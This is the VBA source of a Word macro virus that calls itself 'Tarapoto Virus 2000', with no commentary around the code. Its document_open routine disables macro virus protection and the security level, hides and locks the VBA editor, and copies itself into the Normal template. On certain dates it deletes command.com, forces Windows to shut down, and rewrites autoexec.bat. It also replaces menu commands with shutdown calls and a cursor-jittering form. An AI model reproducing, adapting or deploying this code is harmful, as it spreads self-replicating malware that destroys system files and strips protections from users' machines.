   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub document_open()
   On Error Resume Next
   VBE.MainWindow.Visible = False
   With Options: .VirusProtection = False: .SaveNormalPrompt = False: .ConfirmConversions = False: End With
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable: WordBasic.DisableAutoMacros 0
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   'The dark
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
       CommandBars("Macro").Controls("Seguridad...").Enabled = False
   End If
   ayah = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: aya = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   ID = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(7, 1)
   If ID <> "'The dark" Then
       If ayah >= 1 Then
       With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
       For q = 1 To ayah
       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
       Next q
       End With
       End If
   End If
   p = VBE.CommandBars.Count: pp = VBE.Windows.Count
   For L = 1 To p
   VBE.CommandBars.Item(L).Enabled = False
   Next L
   For L = 1 To pp
   VBE.Windows.Item(L).Visible = False
   Next L
   If ayah < 81 Then
       Set host = NormalTemplate.VBProject.VBComponents.Item(1)
       ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name: ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\windows\wind.sys": ActiveDocument.VBProject.VBComponents.Item(2).Export "c:\windows\wtv.dll": NormalTemplate.VBProject.VBComponents.Import "c:\windows\wtv.dll"
   End If
   If aya = 0 Then
       Set host = ActiveDocument.VBProject.VBComponents.Item(1)
       ActiveDocument.VBProject.VBComponents.Import "c:\windows\wtv.dll"
   End If
   host.CodeModule.AddFromFile ("c:\windows\wind.sys")
   With host.CodeModule
       For x = 1 To 4
       .DeleteLines 1
       Next x
   End With
   Randomize
   a = Int((30 * Rnd) + 1): If Day(Now) = a Then MsgBox "The Dark is Ready... Este documento es una basura", 2046, "Tarapoto Virus 2000"
   If Day(Now) = 1 And (Month(Now) Mod 2 = 0) Then MsgBox Application.UserName & ": Tu Pc esta bajo mi control; Visita Tarapoto Ciudad de las Palmeras. Virus creado por 'The Dark' tpp e-mail:thedarktpp@mixmail.com ", 0, "TARAPOTO VIRUS/tpp.win": Call tppform.Show
   If Day(Now) = 1 And (Month(Now) = 9) Then
   MsgBox "Hoy cumple " & Year(Now) - 1979 & " años mi creador 'The Dark' y por eso nadie trabaja hoy. ", 4096, "TARAPOTO VIRUS/tpp.win"
   Kill ("c:\command.com"): Shell ("c:\windows\rundll32.exe user,exitwindows")
   End If
   If ayah < 81 Then
       With host.CodeModule:
       .replaceline 1, "Sub document_close()": .replaceline 73, "Sub ViewVBcode()"
       .replaceline 76, "Sub HelpAbout()": .replaceline 79, "Sub ToolsMacro()"
       .replaceline 82, "Sub ToolsCustomizeKeyboard()": .replaceline 85, "Sub FileSaveAs()"
       .replaceline 88, "End Sub"
       End With
   End If
       If Day(Now) = 15 Then
           Open "c:\Autoexec.bat" For Input As #1
           Dim w, y: y = 0
           Do While Not EOF(1)
               Line Input #1, w: Debug.Print w
               If w = "rem the dark" Then y = 1
           Loop
           Close #1
           If y = 0 Then
           Name ("c:\Autoexec.bat") As ("c:\autoexe.bat")
           Close: Open "c:\Autoexec.bat" For Output As #1: Print #1, "@ echo off": Print #1, "rem the dark": Print #1, "echo   TaRaPoTo's Soft Copyright 1999 - 2002 ": Print #1, "echo       by: The Dark  ": Print #1, "echo   e-mail: thedarktpp@mixmail.com": Print #1, "echo.  ": Print #1, "pause": Print #1, "Autoexe": Close #1
           End If
       End If
   If ayah >= 88 And aya = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   End Sub
   Sub FileTemplates()
   Shell ("c:\windows\rundll32.exe user,exitwindows")
   End Sub
   Sub ToolsOptions()
   tppform.Show
   End Sub
   Sub ToolsCustomize()
   Shell ("c:\windows\rundll32.exe user,exitwindows")
   End Sub
   Sub organizer()
   tppform.Show
   End Sub
   Sub add1()
   Call document_close '                Tarapoto Virus by the Darktpp
   Dialogs(wdDialogFileSaveAs).Show 'vamos por el normal!!!  Tarapoto - Perú   2000
   End Sub

   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} tppform
      Caption         =   "Tarapoto Virus 2000"
      ClientHeight    =   3165
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   4725
      OleObjectBlob   =   "Virus.MSWord.Tarap-tppform.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "tppform"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False












   Private Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
   Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
   Private Type POINTAPI
           x As Long
           y As Long
   End Type
   Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
   Private Sub UserForm_Click()
   Dim x As Long
   Dim y As Long
   Dim pT As POINTAPI
       Do While w < 4000
           GetCursorPos pT
           x = Rnd(2)
           If x = 0 Then x = -5 Else x = 5
           y = Rnd(2)
           If y = 0 Then y = -5 Else y = 5
           SetCursorPos pT.x + x, pT.y + y
           Sleep 2
           DoEvents
           w = w + 1
           If w Mod 125 = 0 Then
           Label1.Visible = False
           End If
           If w Mod 250 = 1 Then
           Label1.Visible = True
           End If
       Loop
   End Sub
   Private Sub CommandButton1_Click()
   Unload Me
   End Sub
   Private Sub Image1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal y As Single)
   Image1.Visible = False
   End Sub
